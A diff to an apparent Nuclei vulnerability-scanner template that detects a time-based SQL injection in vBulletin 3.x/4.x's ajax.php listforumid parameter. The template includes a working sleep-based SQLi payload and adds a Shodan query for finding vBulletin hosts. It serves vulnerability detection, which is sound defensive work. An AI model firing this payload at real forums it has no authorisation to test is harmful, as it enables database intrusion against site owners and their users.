@@ -1,5 +1,4 @@
 id: vbulletin-ajaxreg-sqli
-
 info:
   name: vBulletin 3.x / 4.x AjaxReg - SQL Injection
   author: mastercho
@@ -14,13 +13,23 @@ info:
     cwe-id: CWE-89
     cpe: cpe:2.3:a:vbulletin:vbulletin:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 1
+    product: vbulletin
+    shodan-query: http.component:"vBulletin"
     vendor: vbulletin
-  tags: time-based-sqli,packetstorm,vbulletin,ajaxreg,sqli,vuln
-
+    verified: true
+  tags: ajaxreg,packetstorm,sqli,time-based-sqli,vbulletin,vuln
 http:
-  - raw:
+  - host-redirects: true
+    matchers:
+      - condition: and
+        dsl:
+          - duration>=6
+          - status_code == 200
+          - contains_any(header, "bb_lastvisit", "bb_sessionhash")
+        type: dsl
+    max-redirects: 3
+    raw:
       - |
         @timeout: 20s
         POST /ajax.php?do=inforum&listforumid=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'"%2B(select(0)from(select(sleep(6)))v)%2B"*/&result=10 HTTP/1.1
@@ -28,14 +37,3 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         undefined&s=&securitytoken=guest
-
-    host-redirects: true
-    max-redirects: 3
-    matchers:
-      - type: dsl
-        dsl:
-          - 'duration>=6'
-          - 'status_code == 200'
-          - 'contains_any(header, "bb_lastvisit", "bb_sessionhash")'
-        condition: and
-
